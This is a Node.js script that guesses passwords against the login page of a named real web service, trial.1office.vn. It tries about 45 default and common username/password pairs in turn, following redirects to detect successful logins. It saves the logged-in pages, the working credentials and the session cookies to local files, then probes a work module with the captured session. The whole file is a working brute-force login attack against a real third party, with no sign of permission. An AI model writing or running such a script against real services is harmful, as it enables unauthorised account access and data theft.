const https = require('https');
const fs = require('fs');
const zlib = require('zlib');
const querystring = require('querystring');

/**
 * Try multiple common credentials for trial.1office.vn
 */

class CredentialTester {
  constructor() {
    this.cookies = '';
    this.requestCount = 0;
  }

  async makeRequest(url, options = {}) {
    this.requestCount++;
    
    return new Promise((resolve, reject) => {
      const defaultOptions = {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate, br',
          'Connection': 'keep-alive',
          'Upgrade-Insecure-Requests': '1',
          'Cookie': this.cookies,
          ...options.headers
        }
      };

      const requestOptions = { ...defaultOptions, ...options };
      
      const req = https.request(url, requestOptions, (res) => {
        // Update cookies
        if (res.headers['set-cookie']) {
          const newCookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
          this.cookies = this.cookies ? `${this.cookies}; ${newCookies}` : newCookies;
        }

        let data = [];
        
        res.on('data', (chunk) => {
          data.push(chunk);
        });
        
        res.on('end', () => {
          let buffer = Buffer.concat(data);
          let body = '';

          // Handle compression
          const encoding = res.headers['content-encoding'];
          try {
            if (encoding === 'gzip') {
              body = zlib.gunzipSync(buffer).toString();
            } else if (encoding === 'deflate') {
              body = zlib.inflateSync(buffer).toString();
            } else if (encoding === 'br') {
              body = zlib.brotliDecompressSync(buffer).toString();
            } else {
              body = buffer.toString();
            }
          } catch (error) {
            body = buffer.toString();
          }

          resolve({
            statusCode: res.statusCode,
            headers: res.headers,
            body: body,
            url: url
          });
        });
      });

      req.on('error', (err) => {
        reject(err);
      });

      if (options.data) {
        req.write(options.data);
      }

      req.end();
    });
  }

  async testCredentials() {
    console.log('🔍 Testing multiple credentials for trial.1office.vn...');

    // Extended list of common trial/demo credentials
    const credentialsList = [
      // Standard admin accounts
      { username: 'admin', password: 'admin' },
      { username: 'admin', password: 'admin123' },
      { username: 'admin', password: 'admin@123' },
      { username: 'admin', password: 'password' },
      { username: 'admin', password: '123456' },
      { username: 'admin', password: 'admin2024' },
      { username: 'admin', password: 'admin2025' },
      
      // Demo accounts
      { username: 'demo', password: 'demo' },
      { username: 'demo', password: 'demo123' },
      { username: 'demo', password: 'demo@123' },
      { username: 'demo', password: 'password' },
      
      // Trial accounts
      { username: 'trial', password: 'trial' },
      { username: 'trial', password: 'trial123' },
      { username: 'trial', password: 'trial@123' },
      
      // Test accounts
      { username: 'test', password: 'test' },
      { username: 'test', password: 'test123' },
      { username: 'test', password: 'test@123' },
      
      // Guest accounts
      { username: 'guest', password: 'guest' },
      { username: 'guest', password: 'guest123' },
      
      // Email format accounts
      { username: 'admin@1office.vn', password: 'admin' },
      { username: 'admin@1office.vn', password: 'admin123' },
      { username: 'admin@1office.vn', password: 'admin@123' },
      { username: 'demo@1office.vn', password: 'demo' },
      { username: 'demo@1office.vn', password: 'demo123' },
      { username: 'demo@1office.vn', password: 'demo@123' },
      { username: 'trial@1office.vn', password: 'trial' },
      { username: 'trial@1office.vn', password: 'trial123' },
      { username: 'test@1office.vn', password: 'test123' },
      
      // 1Office specific
      { username: '1office', password: '1office' },
      { username: '1office', password: '1office123' },
      { username: 'office', password: 'office' },
      { username: 'office', password: 'office123' },
      
      // Common Vietnamese
      { username: 'quantri', password: 'quantri' },
      { username: 'quantri', password: 'quantri123' },
      { username: 'quanly', password: 'quanly' },
      { username: 'quanly', password: 'quanly123' },
      
      // Numeric accounts
      { username: '123456', password: '123456' },
      { username: '111111', password: '111111' },
      { username: '000000', password: '000000' },
      
      // Default system accounts
      { username: 'root', password: 'root' },
      { username: 'user', password: 'user' },
      { username: 'user', password: 'password' },
      { username: 'system', password: 'system' }
    ];

    const results = [];

    for (let i = 0; i < credentialsList.length; i++) {
      const creds = credentialsList[i];
      console.log(`\\n[${i + 1}/${credentialsList.length}] Testing: ${creds.username} / ${creds.password}`);

      try {
        // Reset cookies for each attempt
        this.cookies = '';

        // Get fresh login page
        const loginPageResponse = await this.makeRequest('https://trial.1office.vn/login');
        
        if (loginPageResponse.statusCode !== 200) {
          console.log(`  ❌ Cannot access login page: ${loginPageResponse.statusCode}`);
          continue;
        }

        // Prepare login data
        const loginData = {
          username: creds.username,
          userpwd: creds.password,
          url_login: 'https://trial.1office.vn/login',
          selected_language: 'en'
        };

        const postData = querystring.stringify(loginData);

        // Attempt login
        const loginResponse = await this.makeRequest('https://trial.1office.vn/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': 'https://trial.1office.vn/login'
          },
          data: postData
        });

        console.log(`  📊 Login response: ${loginResponse.statusCode}`);

        let loginSuccess = false;
        let redirectUrl = '';

        // Check for successful login
        if (loginResponse.statusCode === 302) {
          redirectUrl = loginResponse.headers.location || '';
          console.log(`  🔄 Redirect to: ${redirectUrl}`);

          // Follow redirect if not back to login
          if (redirectUrl && !redirectUrl.includes('/login')) {
            const redirectResponse = await this.makeRequest(redirectUrl);
            console.log(`  📍 Redirect response: ${redirectResponse.statusCode}`);

            // Check for success indicators
            const hasUserInfo = redirectResponse.body.includes('logout') || 
                               redirectResponse.body.includes('profile') ||
                               redirectResponse.body.includes('dashboard') ||
                               redirectResponse.body.includes('admin') ||
                               redirectResponse.body.includes('user') ||
                               !redirectResponse.body.includes('form-login');

            if (hasUserInfo && redirectResponse.body.length > 5000) {
              loginSuccess = true;
              console.log(`  🎉 LOGIN SUCCESS!`);
              
              // Save successful login details
              fs.writeFileSync(`success-${creds.username.replace('@', '-').replace('.', '-')}.html`, redirectResponse.body);
              
              // Test work module access
              console.log(`  🔍 Testing work module access...`);
              const workResponse = await this.makeRequest('https://trial.1office.vn/work');
              console.log(`  📦 Work module: ${workResponse.statusCode} (${workResponse.body.length} chars)`);
              
              if (workResponse.statusCode === 200 && workResponse.body.length > 1000) {
                console.log(`  ✅ Work module accessible!`);
                fs.writeFileSync(`work-success-${creds.username.replace('@', '-').replace('.', '-')}.html`, workResponse.body);
              }
            }
          } else {
            console.log(`  ❌ Redirected back to login - failed`);
          }
        } else if (loginResponse.statusCode === 200) {
          // Check if still on login page
          if (loginResponse.body.includes('form-login')) {
            console.log(`  ❌ Still on login page - failed`);
          } else {
            console.log(`  ✅ Possible success - checking content`);
            if (loginResponse.body.length > 5000) {
              loginSuccess = true;
              fs.writeFileSync(`success-direct-${creds.username.replace('@', '-').replace('.', '-')}.html`, loginResponse.body);
            }
          }
        }

        results.push({
          username: creds.username,
          password: creds.password,
          success: loginSuccess,
          statusCode: loginResponse.statusCode,
          redirectUrl: redirectUrl,
          responseLength: loginResponse.body.length
        });

        if (loginSuccess) {
          console.log(`  🎊 FOUND WORKING CREDENTIALS: ${creds.username} / ${creds.password}`);
          
          // Save session info
          fs.writeFileSync('working-credentials.json', JSON.stringify({
            credentials: creds,
            cookies: this.cookies,
            timestamp: new Date().toISOString()
          }, null, 2));
          
          // Don't break - continue testing to find all working credentials
        }

        // Small delay between attempts
        await new Promise(resolve => setTimeout(resolve, 1000));

      } catch (error) {
        console.log(`  💥 Error: ${error.message}`);
        results.push({
          username: creds.username,
          password: creds.password,
          success: false,
          error: error.message
        });
      }
    }

    // Summary
    console.log('\\n📊 CREDENTIAL TESTING SUMMARY:');
    console.log(`Total tested: ${results.length}`);
    
    const successful = results.filter(r => r.success);
    console.log(`Successful logins: ${successful.length}`);
    
    if (successful.length > 0) {
      console.log('\\n✅ WORKING CREDENTIALS:');
      successful.forEach(cred => {
        console.log(`  🔑 ${cred.username} / ${cred.password}`);
      });
    } else {
      console.log('\\n❌ No working credentials found');
      
      // Show some promising attempts
      const promising = results.filter(r => r.statusCode === 302 && r.redirectUrl && !r.redirectUrl.includes('/login'));
      if (promising.length > 0) {
        console.log('\\n🤔 Promising attempts (redirected but may need verification):');
        promising.forEach(cred => {
          console.log(`  🔄 ${cred.username} / ${cred.password} → ${cred.redirectUrl}`);
        });
      }
    }

    // Save full results
    fs.writeFileSync('credential-test-results.json', JSON.stringify(results, null, 2));
    console.log('\\n💾 Full results saved to credential-test-results.json');

    return results;
  }
}

// Run the credential testing
const tester = new CredentialTester();
tester.testCredentials()
  .then(results => {
    console.log('\\n🎉 Credential testing completed!');
  })
  .catch(error => {
    console.error('💥 Testing failed:', error.message);
  });
